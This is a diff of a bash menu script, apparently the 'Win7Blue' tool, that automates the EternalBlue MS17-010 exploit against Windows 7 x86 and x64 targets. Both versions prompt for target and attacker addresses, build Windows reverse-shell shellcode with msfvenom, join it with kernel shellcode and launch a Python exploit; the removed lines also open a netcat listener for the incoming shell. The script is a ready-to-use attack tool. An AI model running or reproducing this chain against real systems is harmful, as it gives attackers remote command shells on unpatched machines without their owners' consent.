@@ -1,294 +1,198 @@
 #!/bin/bash
 
-#Author : d4t4s3c
-#Twitter: @d4t4s3c
-#Email  : d4t4s3c@protonmail.com
-#GitHub : www.github.com/d4t4s3c
-
 #colors
-b="\033[1;37m"
-r="\033[1;31m"
-v="\033[1;32m"
-a="\033[1;33m"
-az="\033[1;34m"
-nc="\e[0m"
+declare -r White="\e[97m"
+declare -r GrayLight="\e[37m"
+declare -r GrayDark="\e[90m"
+declare -r Red="\e[31m"
+declare -r RedLight="\e[91m"
+declare -r Green="\e[32m"
+declare -r GreenLight="\e[92m"
+declare -r Yellow="\e[33m"
+declare -r YellowLight="\e[93m"
+declare -r Blue="\e[34m"
+declare -r BlueLight="\e[94m"
+declare -r Magenta="\e[35m"
+declare -r MagentaLight="\e[95m"
+declare -r Cyan="\e[36m"
+declare -r CyanLight="\e[96m"
+declare -r End="\e[0m"
 
 #var
-shell="$"
-n0=0
-n1=1
-n2=2
-n3=3
-n4=4
-si=✔
-no=✘
-k1="x86"
-k2="x64"
-z="IP?"
-x="Scan IP:"
-c="Scan Completed"
-in="Invalid Option"
-rh="¿RHOST?"
-lh="¿LHOST?"
-lp="¿LPORT?"
-netcat="Creating listening with NETCAT"
-msf="Creating SHELLCODE with MSFVENOM"
+declare -r shell="$"
+declare -r var1="1"
+declare -r var2="2"
+declare -r var3="3"
+declare -r var4="4"
+declare -r var5="Scan"
+declare -r var6="Exploit Windows 7"
+declare -r var7="x86"
+declare -r var8="x64"
+declare -r var9="["
+declare -r var10="]"
+declare -r var11="+"
+declare -r var12="--"
+declare -r var13="Exit"
+declare -r var14="¿"
+declare -r var15="?"
+declare -r var16="RHOST"
+declare -r var17="LHOST"
+declare -r var18="LPORT"
+declare -r var19="Creating SHELLCODE with MSFVENOM"
+declare -r var20="EternalBlue"
+declare -r var21="MS17-010"
+declare -r var22="i"
+declare -r var23="x"
+declare -r var24="checking root user"
+declare -r var25="root"
+declare -r var26="NO root"
+declare -r var27="checking msfvenom installed"
+declare -r var28="msfvenom"
+declare -r var29="msfvenom not installed"
 
-function checkroot(){
+
+function check(){
 	    echo ""
-	    echo -e "$a check root user $nc"
-	    sleep 4
+	    echo -e "$White$var9$YellowLight$var22$White$var10 $White$var24$End"
+	    sleep 2
     if [ "$(id -u)" == "0" ]; then
 	    echo ""
-	    echo -e " $b[$v$si$b] root $nc"
-	    sleep 4
+	    echo -e "$White$var9$GreenLight$var11$White$var10 $White$var25$End"
+	    sleep 2
 	    echo ""
     else
-            echo ""
-	    echo -e " $b[$r$no$b] root $nc"
-	    sleep 4
 	    echo ""
-	    echo -e "$r EXITING $nc"
-	    sleep 4
+	    echo -e "$White$var9$Red$var23$White$var10 $White$var26$End"
+	    sleep 2
 	    echo ""
-	    exit
+		exit 1
     fi	
 }
 
-function dep1(){
-	    echo -e "$a check dependencies $nc"
-	    sleep 4
-	    which xterm > /dev/null 2>&1
-    if [ "$(echo $?)" == "0" ]; then
-	    echo ""
-	    echo -e " $b[$v$si$b] xterm installed $nc"
-	    sleep 4
-    else
-            echo ""
-	    echo -e " $b[$r$no$b] xterm no installed $nc"
-	    sleep 4
-	    echo ""
-	    echo -e "$b installing xterm $nc"
-	    sleep 4
-	    echo ""
-	    apt-get install xterm -y > /dev/null 2>&1
-	    echo -e " $b[$v$si$b] xterm installed $nc"
-	    sleep 4
-    fi
-}
-
-function dep2(){
-	    which nc > /dev/null 2>&1
-    if [ "$(echo $?)" == "0" ]; then
-    	    echo ""
-	    echo -e " $b[$v$si$b] netcat installed $nc"
-	    sleep 4
-	    echo ""
-    else
-            echo ""
-	    echo -e " $b[$r$no$b] netcat no installed $nc"
-	    sleep 4
-	    echo ""
-	    echo -e "$b installing netcat $nc"
-	    sleep 4
-	    echo ""
-	    apt-get install netcat -y > /dev/null 2>&1
-	    echo -e " $b[$v$si$b] netcat installed $nc"
-	    echo ""
-    fi
-}
-
-function dep3(){
-	    which rlwrap > /dev/null 2>&1
-    if [ "$(echo $?)" == "0" ]; then
-	    echo -e " $b[$v$si$b] rlwrap installed $nc"
-	    sleep 4
-	    echo ""
-    else
-            echo ""
-	    echo -e " $b[$r$no$b] rlwrap no installed $nc"
-	    sleep 4
-	    echo ""
-	    echo -e "$b installing rlwrap $nc"
-	    sleep 4
-	    echo ""
-	    apt-get install rlwrap -y > /dev/null 2>&1
-	    echo -e " $b[$v$si$b] rlwrap installed $nc"
-	    echo ""
-    fi
-}
-
-function dep4(){
+function msf(){
+		echo -e "$White$var9$YellowLight$var22$White$var10 $White$var27$End"
+		sleep 2
 	    which msfvenom > /dev/null 2>&1
     if [ "$(echo $?)" == "0" ]; then
-	    echo -e " $b[$v$si$b] msfvenom installed $nc"
-	    sleep 4
+		echo ""
+	    echo -e "$White$var9$GreenLight$var11$White$var10 $White$var28$End"
+	    sleep 2
 	    echo ""
+		clear
     else
-            echo ""
-	    echo -e " $b[$r$no$b] msfvenom no installed $nc"
-	    sleep 4
+        echo ""
+	    echo -e "$White$var9$Red$var23$White$var10 $White$var29$End"
+	    sleep 2
 	    echo ""
-	    exit
+	    exit 1
     fi
-}
-
-function dep5(){
-	    echo -e " $b[$v$si$b] impacket installed $nc"
-	    sleep 4
-	    echo ""
-	    pip install impacket > /dev/null 2>&1
-            pip3 install impacket > /dev/null 2>&1
-	    echo ""
 }
 
 function banner(){
-           echo ""
-           echo -e "$b┌═══════════════════════════════════┐"
-           echo -e "$b║$az  ██╗    ██╗██╗███╗   ██╗███████╗  $b║"
-           echo -e "$b║$az  ██║    ██║██║████╗  ██║╚════██║  $b║" 
-           echo -e "$b║$az  ██║ █╗ ██║██║██╔██╗ ██║    ██╔╝  $b║" 
-           echo -e "$b║$az  ██║███╗██║██║██║╚██╗██║   ██╔╝   $b║"  
-           echo -e "$b║$az  ╚███╔███╔╝██║██║ ╚████║   ██║    $b║"
-           echo -e "$b║$az   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝    $b║"   
-           echo -e "$b║$az ██████╗ ██╗     ██╗   ██╗███████╗ $b║"
-           echo -e "$b║$az ██╔══██╗██║     ██║   ██║██╔════╝ $b║"
-           echo -e "$b║$az ██████╔╝██║     ██║   ██║█████╗   $b║"  
-           echo -e "$b║$az ██╔══██╗██║     ██║   ██║██╔══╝   $b║" 
-           echo -e "$b║$az ██████╔╝███████╗╚██████╔╝███████╗ $b║"
-           echo -e "$b║$az ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ $b║"
-           echo -e "$b║$r  Author $b:$a d4t4s3c                 $b║"
-           echo -e "$b║$r  Email  $b:$a d4t4s3c@protonmail.com  $b║"
-           echo -e "$b║$r  GitHub $b:$a www.github.com/d4t4s3c  $b║"
-           echo -e "$b└═══════════════════════════════════┘$b"
+	echo ""
+    echo -e "$BlueLight┌═══════════════════════════════════┐$End"
+    echo -e "$BlueLight║$Blue  ██╗    ██╗██╗███╗   ██╗███████╗  $BlueLight║$End"
+    echo -e "$BlueLight║$Blue  ██║    ██║██║████╗  ██║╚════██║  $BlueLight║$End" 
+    echo -e "$BlueLight║$Blue  ██║ █╗ ██║██║██╔██╗ ██║    ██╔╝  $BlueLight║$End" 
+    echo -e "$BlueLight║$Blue  ██║███╗██║██║██║╚██╗██║   ██╔╝   $BlueLight║$End"  
+    echo -e "$BlueLight║$Blue  ╚███╔███╔╝██║██║ ╚████║   ██║    $BlueLight║$End"
+    echo -e "$BlueLight║$Blue   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝    $BlueLight║$End"   
+    echo -e "$BlueLight║$Blue ██████╗ ██╗     ██╗   ██╗███████╗ $BlueLight║$End"
+    echo -e "$BlueLight║$Blue ██╔══██╗██║     ██║   ██║██╔════╝ $BlueLight║$End"
+    echo -e "$BlueLight║$Blue ██████╔╝██║     ██║   ██║█████╗   $BlueLight║$End"  
+    echo -e "$BlueLight║$Blue ██╔══██╗██║     ██║   ██║██╔══╝   $BlueLight║$End" 
+    echo -e "$BlueLight║$Blue ██████╔╝███████╗╚██████╔╝███████╗ $BlueLight║$End"
+    echo -e "$BlueLight║$Blue ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ $BlueLight║$End"
+	echo -e "$BlueLight║$White $var9$Blue$var11$White$var10  $Green$var20 $White$var12 $Green$var21  $White$var9$Blue$var11$White$var10 $BlueLight║$End"
+    echo -e "$BlueLight└═══════════════════════════════════┘$End"
 }
 
 function main(){
-	   echo ""
-           echo -e "$b[$az$n1$b] Scan $nc"
-           echo -e "$b[$az$n2$b] Exploit Windows 7 $az$k1 $nc"
-           echo -e "$b[$az$n3$b] Exploit Windows 7 $az$k2 $nc"                
-           echo -e "$b[$az$n4$b] Exit"
-           echo ""
+	echo ""
+	echo -e "$White$var9$Blue$var1$White$var10 $var5$End"
+	echo -e "$White$var9$Blue$var2$White$var10 $var6 $Blue$var7$End"
+	echo -e "$White$var9$Blue$var3$White$var10 $var6 $Blue$var8$End"
+	echo -e "$White$var9$Blue$var4$White$var10 $var13$End"
+	echo ""
 }
 
 function menu(){
 
-read -p " $(echo -e $az$shell $nc)" opc
+read -p " $(echo -e $Blue$shell $End)" opc
 
     if [ $opc -eq 1 ]; then
-   	   echo ""
-	   echo -e "$az$rh$nc"
-	   echo ""
-	   read rhost
-	   echo ""
-	   echo -e "$az$x $r$rhost $nc"
-	   echo ""
-	   sleep 2
-           python eternalblue_scanner.py $rhost
-           echo ""
-           echo -e "$az$c$nc"
-           sleep 4
-           echo ""
-           main
-           menu
+   	   	echo ""
+	   	echo -e "$White$var14$Blue$var16$White$var15$End"
+	   	echo ""
+	   	read rhost
+	   	echo ""
+    	python eternalblue_scanner.py $rhost
+    	echo ""
+		exit 0
     elif [ $opc -eq 2 ]; then
-	   echo ""
-	   echo -e "$az$rh$nc"
-	   echo ""
-	   read rhost
-	   echo ""
-	   echo -e "$az$lh$nc"
-	   echo ""
-	   read lhost
-	   echo ""
-	   echo -e "$az$lp$nc"
-	   echo ""
-	   read lport
-	   echo ""
-	   rm -rf sc_x86_msf.bin
-	   rm -rf sc_x86.bin
-	   echo -e "$az$netcat$nc"
-	   echo ""
-	   sleep 2
-	   xterm -hold -e "rlwrap nc -lvnp $lport" &
-	   echo -e "$az$msf$nc"
-	   echo ""
-	   sleep 2
-	   msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
-	   sleep 1
-           cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
-           sleep 1
-           python eternalblue_exploit7.py $rhost sc_x86.bin
-	   exit
+	   	echo ""
+	   	echo -e "$White$var14$Blue$var16$White$var15$End"
+	   	echo ""
+	   	read rhost
+	   	echo ""
+	   	echo -e "$White$var14$Blue$var17$White$var15$End"
+	   	echo ""
+	   	read lhost
+	   	echo ""
+	   	echo -e "$White$var14$Blue$var18$White$var15$End"
+	   	echo ""
+	   	read lport
+	   	echo ""
+	   	rm -rf sc_x86_msf.bin
+	   	rm -rf sc_x86.bin
+	   	echo -e "$Blue$var19$End"
+	   	echo ""
+	   	sleep 2
+	    msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
+	    sleep 1
+        cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
+        sleep 1
+        python3 ms17_010_eternalblue.py $rhost sc_x86.bin
+	   	exit
     elif [ $opc -eq 3 ]; then
-           echo ""
-	   echo -e "$az$rh$nc"
-	   echo ""
-	   read rhost
-	   echo ""
-	   echo -e "$az$lh$nc"
-	   echo ""
-	   read lhost
-	   echo ""
-	   echo -e "$az$lp$nc"
-	   echo ""
-	   read lport
-	   echo ""
-	   rm -rf sc_x64_msf.bin
-	   rm -rf sc_x64.bin
-	   echo -e "$az$netcat$nc"
-	   echo ""
-	   sleep 2
-	   xterm -hold -e "rlwrap nc -lvnp $lport" &
-	   echo -e "$az$msf$nc"
-	   echo ""
-	   sleep 2
-	   msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
-	   sleep 1
-           cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
-           sleep 1
-           python eternalblue_exploit7.py $rhost sc_x64.bin
-	   exit
+        echo ""
+	   	echo -e "$White$var14$Blue$var16$White$var15$End"
+	   	echo ""
+	   	read rhost
+	   	echo ""
+	   	echo -e "$White$var14$Blue$var17$White$var15$End"
+	   	echo ""
+	   	read lhost
+	   	echo ""
+	   	echo -e "$White$var14$Blue$var18$White$var15$End"
+	   	echo ""
+	   	read lport
+	   	echo ""
+	   	rm -rf sc_x64_msf.bin
+	   	rm -rf sc_x64.bin
+	   	echo -e "$Blue$var19$End"
+	   	echo ""
+	   	sleep 2
+	   	msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
+	   	sleep 1
+        cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
+        sleep 1
+        python3 ms17_010_eternalblue.py $rhost sc_x64.bin
     elif [ $opc -eq 4 ]; then
-	   echo ""
-	   echo ""
-	   echo -e "$a        |\/\/\/|"
-           echo -e "        |      |" 
-           echo -e "        |      |" 
-           echo -e "        | (o)(o) " 
-           echo -e "        C      _) "
-           echo -e "         | ,___|  "
-           echo -e "         |   /    "
-           echo -e "        /____\ "
-           echo -e "       /      \ $nc"
-           echo -e "$b#### $v BYE $v HACKER $b ####$nc"
-           echo ""
-           echo ""
-	   sleep 3
-	   tput cnorm
-	   exit 0
+		echo ""
+		exit 0
     else
-	   echo ""
-	   echo -e "$b$in$nc"
-	   echo ""
-	   sleep 2
-	   banner
-	   main
-	   menu
+		:
     fi
 }
 
+function start(){
 clear
-tput civis
-checkroot
-dep1
-dep2
-dep3
-dep4
-dep5
-clear
+check
+msf
 banner
 main
-tput cnorm
 menu
+}
+
+start
